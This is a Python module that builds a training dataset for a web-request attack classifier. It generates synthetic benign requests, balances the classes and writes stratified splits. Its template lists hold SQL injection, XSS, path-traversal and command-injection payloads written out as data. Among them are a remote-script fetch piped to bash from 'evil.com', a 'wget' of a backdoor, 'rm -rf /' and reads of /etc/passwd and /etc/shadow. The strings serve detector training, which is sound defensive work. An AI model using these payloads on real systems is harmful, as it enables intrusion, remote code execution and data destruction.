"""
Dataset Preprocessing and Expansion Pipeline

This module handles:
1. Loading and combining multiple attack datasets
2. Generating synthetic benign traffic
3. Data cleaning and normalization
4. Train/Val/Test splits with stratification
5. Dataset statistics and validation
"""

import pandas as pd
import numpy as np
import json
from pathlib import Path
from sklearn.model_selection import train_test_split
from typing import Dict, List, Tuple
import random
from request_encoder import RequestEncoder



class DatasetPreprocessor:
    """Handles dataset loading, cleaning, and preprocessing."""
    
    def __init__(self, raw_dir: str = "data/raw", processed_dir: str = "data/processed"):
        self.raw_dir = Path(raw_dir)
        self.processed_dir = Path(processed_dir)
        self.processed_dir.mkdir(parents=True, exist_ok=True)
        
        self.label_map = {
            "SAFE": 0,
            "SQLI": 1,
            "XSS": 2,
            "PATH_TRAVERSAL": 3,
            "COMMAND_INJECTION": 4
        }
        
        self.encoder = RequestEncoder()
    
    def load_base_dataset(self) -> pd.DataFrame:
        """Load the base dataset from requests.csv."""
        csv_path = self.raw_dir / "requests.csv"
        
        
        if not csv_path.exists():
            raise FileNotFoundError(f"Base dataset not found at {csv_path}")
        
        # Try loading with different strategies
        try:
            # First try: skip bad lines
            df = pd.read_csv(csv_path, on_bad_lines='skip')
        except Exception as e:
            print(f"Warning: Error loading CSV with default settings: {e}")
            # Fallback: manual parsing
            try:
                df = pd.read_csv(csv_path, quoting=1)
            except:
                raise ValueError(f"Could not parse CSV file {csv_path}")
        
        # Clean up any malformed entries
        df = df.dropna()
        df = df[df['text'].str.len() > 0]
        
        print(f"Loaded base dataset: {len(df)} samples")
        
        return df
    
    
    def generate_synthetic_benign(self, count: int = 500) -> List[Dict[str, str]]:
        """Generate synthetic benign HTTP requests."""
        
        # Realistic e-commerce paths
        paths = [
            "/", "/home", "/index.html", "/about", "/contact", "/faq",
            "/products", "/products/electronics", "/products/clothing",
            "/cart", "/checkout", "/orders", "/profile", "/settings",
            "/blog", "/blog/tech-news", "/blog/tutorials",
            "/support", "/privacy", "/terms", "/search"
        ]
        
        # Realistic query parameters
        safe_queries = [
            "id=123", "id=456", "id=789",
            "category=electronics", "category=clothing", "category=books",
            "q=laptop", "q=smartphone", "q=headphones", "q=camera",
            "page=1", "page=2", "sort=price", "sort=rating",
            "status=completed", "status=pending", "status=shipped",
            "filter=new", "filter=sale", "limit=10", "offset=20"
        ]
        
        # Realistic POST bodies
        safe_bodies = [
            "username=john&password=secure123",
            "email=user@example.com&message=Hello",
            "product_id=10&qty=1",
            "name=Alice&address=123 Main St&city=NYC",
            "rating=5&comment=Great product",
            "search=laptop computer",
            "feedback=The service was excellent"
        ]
        
        samples = []
        
        for _ in range(count):
            # Choose method
            method = random.choice(["GET", "GET", "GET", "POST"])  # More GETs
            
            # Choose path
            path = random.choice(paths)
            
            if method == "GET":
                # GET with query params (70% chance)
                if random.random() < 0.7:
                    query = random.choice(safe_queries)
                    text = f"{method} {path}?{query}"
                else:
                    text = f"{method} {path}"
            else:
                # POST with body
                body = random.choice(safe_bodies)
                text = f"{method} {path} {body}"
            
            samples.append({"text": text, "label": "SAFE"})
        
        return samples
    
    def generate_synthetic_attacks(self, count: int = 400) -> List[Dict[str, str]]:
        """Generate synthetic attack payloads."""
        
        samples = []
        
        # SQL Injection templates
        sqli_templates = [
            "GET /login?user=admin' OR '1'='1",
            "GET /login?user=admin'--",
            "GET /search?id=1 UNION SELECT password FROM users",
            "GET /item?id=10 OR 1=1",
            "POST /auth user=admin' OR 'x'='x",
            "GET /data?id=5; DROP TABLE users;",
            "GET /account?id=7 UNION ALL SELECT NULL,NULL",
            "GET /api/user?id=5 OR SLEEP(5)",
            "GET /product?id=1' AND 1=0 UNION SELECT credit_card FROM payments",
            "GET /filter?price=100' OR '1'='1'--"
        ]
        
        # XSS templates
        xss_templates = [
            "GET /search?q=<script>alert(1)</script>",
            "GET /comment?msg=<img src=x onerror=alert(1)>",
            "POST /feedback message=<script>document.cookie</script>",
            "GET /profile?name=<svg onload=alert(1)>",
            "GET /test?<script>alert('XSS')</script>",
            "GET /input?data=<iframe src=javascript:alert(1)>",
            "POST /post content=<body onload=alert(1)>",
            "GET /xss?payload=<img src=1 onerror=alert(document.domain)>",
            "GET /chat?msg=<marquee onstart=alert(1)>",
            "GET /page?content=<script>fetch('http://evil.com')</script>"
        ]
        
        # Path Traversal templates
        path_traversal_templates = [
            "GET /?page=../../etc/passwd",
            "GET /download?file=../../../etc/shadow",
            "GET /view?path=../config/settings.py",
            "GET /open?file=../../../../windows/system32",
            "GET /load?module=../../../../boot.ini",
            "GET /image?name=../../uploads/private.jpg",
            "GET /api/read?file=../.env",
            "GET /static?file=../../../../var/log/auth.log",
            "GET /export?path=../db.sqlite3",
            "GET /logs?file=../../app.log"
        ]
        
        # Command Injection templates
        cmd_injection_templates = [
            "GET /ping?ip=127.0.0.1;ls",
            "GET /ping?host=8.8.8.8 && cat /etc/passwd",
            "POST /execute cmd=whoami",
            "GET /run?cmd=rm -rf /",
            "GET /system?cmd=netstat -an",
            "POST /shell command=python -c \"import os;os.system('id')\"",
            "GET /admin?cmd=ls | grep password",
            "GET /tool?exec=curl http://evil.com/shell.sh | bash",
            "POST /api/exec command=wget malicious.com/backdoor",
            "GET /debug?code=system('cat /etc/passwd')"
        ]
        
        # Generate samples
        attack_types = [
            (sqli_templates, "SQLI"),
            (xss_templates, "XSS"),
            (path_traversal_templates, "PATH_TRAVERSAL"),
            (cmd_injection_templates, "COMMAND_INJECTION")
        ]
        
        for templates, label in attack_types:
            for _ in range(count // 4):
                template = random.choice(templates)
                samples.append({"text": template, "label": label})
        
        return samples
    
    def expand_dataset(self, target_size: int = 2000) -> pd.DataFrame:
        """
        Expand the base dataset with synthetic samples.
        
        Args:
            target_size: Target total dataset size
        
        Returns:
            Expanded DataFrame
        """
        # Load base dataset
        base_df = self.load_base_dataset()
        
        # Calculate how many synthetic samples to generate
        current_size = len(base_df)
        needed = max(0, target_size - current_size)
        
        if needed == 0:
            print(f"Base dataset already has {current_size} samples (target: {target_size})")
            return base_df
        
        print(f"Generating {needed} synthetic samples...")
        
        # Generate synthetic data (70% benign, 30% attacks)
        benign_count = int(needed * 0.7)
        attack_count = needed - benign_count
        
        benign_samples = self.generate_synthetic_benign(benign_count)
        attack_samples = self.generate_synthetic_attacks(attack_count)
        
        # Combine
        synthetic_df = pd.DataFrame(benign_samples + attack_samples)
        
        # Merge with base dataset
        combined_df = pd.concat([base_df, synthetic_df], ignore_index=True)
        
        # Shuffle
        combined_df = combined_df.sample(frac=1, random_state=42).reset_index(drop=True)
        
        print(f"Total dataset size: {len(combined_df)} samples")
        
        return combined_df
    
    def apply_context_encoding(self, df: pd.DataFrame, column: str = "text") -> pd.DataFrame:
        """Apply context-enriched encoding to text column."""
        print("Applying context-enriched encoding...")
        
        df["encoded_text"] = df[column].apply(lambda x: self.encoder.encode_simple(str(x)))
        
        return df
    
    def create_splits(self, df: pd.DataFrame, 
                     train_size: float = 0.7,
                     val_size: float = 0.15,
                     test_size: float = 0.15,
                     random_state: int = 42) -> Tuple[pd.DataFrame, pd.DataFrame, pd.DataFrame]:
        """
        Create stratified train/val/test splits.
        
        Args:
            df: Input DataFrame
            train_size: Training set proportion
            val_size: Validation set proportion
            test_size: Test set proportion
            random_state: Random seed
        
        Returns:
            Tuple of (train_df, val_df, test_df)
        """
        assert abs(train_size + val_size + test_size - 1.0) < 0.001, "Sizes must sum to 1.0"
        
        # First split: train vs (val + test)
        train_df, temp_df = train_test_split(
            df,
            test_size=(val_size + test_size),
            stratify=df['label'],
            random_state=random_state
        )
        
        # Second split: val vs test
        val_ratio = val_size / (val_size + test_size)
        val_df, test_df = train_test_split(
            temp_df,
            test_size=(1 - val_ratio),
            stratify=temp_df['label'],
            random_state=random_state
        )
        
        print(f"Split sizes: Train={len(train_df)}, Val={len(val_df)}, Test={len(test_df)}")
        
        return train_df, val_df, test_df
    
    def generate_statistics(self, df: pd.DataFrame) -> Dict:
        """Generate dataset statistics."""
        stats = {
            "total_samples": int(len(df)),
            "class_distribution": {k: int(v) for k, v in df['label'].value_counts().to_dict().items()},
            "class_percentages": {k: float(v) for k, v in (df['label'].value_counts(normalize=True) * 100).round(2).to_dict().items()}
        }
        
        if 'encoded_text' in df.columns:
            stats["avg_text_length"] = float(df['encoded_text'].str.len().mean())
            stats["max_text_length"] = int(df['encoded_text'].str.len().max())
        else:
            stats["avg_text_length"] = float(df['text'].str.len().mean())
            stats["max_text_length"] = int(df['text'].str.len().max())
        
        return stats
    
    def save_splits(self, train_df: pd.DataFrame, val_df: pd.DataFrame, test_df: pd.DataFrame):
        """Save train/val/test splits to CSV files."""
        train_df.to_csv(self.processed_dir / "train.csv", index=False)
        val_df.to_csv(self.processed_dir / "val.csv", index=False)
        test_df.to_csv(self.processed_dir / "test.csv", index=False)
        
        print(f"Saved splits to {self.processed_dir}")
        
        # Generate and save statistics
        stats = {
            "train": self.generate_statistics(train_df),
            "val": self.generate_statistics(val_df),
            "test": self.generate_statistics(test_df)
        }
        
        with open(self.processed_dir / "stats.json", "w") as f:
            json.dump(stats, f, indent=2)
        
        print(f"Saved statistics to {self.processed_dir / 'stats.json'}")
        
        return stats
    
    def run_pipeline(self, target_size: int = 2000, use_encoding: bool = True):
        """
        Run the complete preprocessing pipeline.
        
        Args:
            target_size: Target dataset size
            use_encoding: Whether to apply context-enriched encoding
        """
        print("="*60)
        print("Starting Data Preprocessing Pipeline")
        print("="*60)
        
        # Step 1: Expand dataset
        df = self.expand_dataset(target_size)

        # Step 2: Apply context encoding (optional)
        if use_encoding:
         df = self.apply_context_encoding(df)

        # 🔴 STEP 2.5: BALANCE THE DATASET (VERY IMPORTANT)
        print("\nBefore balancing:")
        print(df["label"].value_counts())

        min_count = df["label"].value_counts().min()

        df = (
           df.groupby("label", group_keys=False)
            .apply(lambda x: x.sample(min_count, random_state=42))
            .reset_index(drop=True)
        )

        print("\nAfter balancing:")
        print(df["label"].value_counts())

        # Step 3: Create splits
        train_df, val_df, test_df = self.create_splits(df)

        # Step 4: Save splits and generate stats
        stats = self.save_splits(train_df, val_df, test_df)


        
        print("="*60)
        print("Dataset Statistics")
        print("="*60)
        
        for split_name, split_stats in stats.items():
            print(f"\n{split_name.upper()}:")
            print(f"  Total samples: {split_stats['total_samples']}")
            print(f"  Class distribution:")
            for label, count in split_stats['class_distribution'].items():
                pct = split_stats['class_percentages'][label]
                print(f"    {label}: {count} ({pct}%)")
        
        print("\n" + "="*60)
        print("Pipeline completed successfully!")
        print("="*60)


if __name__ == "__main__":
    # Run the preprocessing pipeline
    preprocessor = DatasetPreprocessor()
    preprocessor.run_pipeline(target_size=2000, use_encoding=True)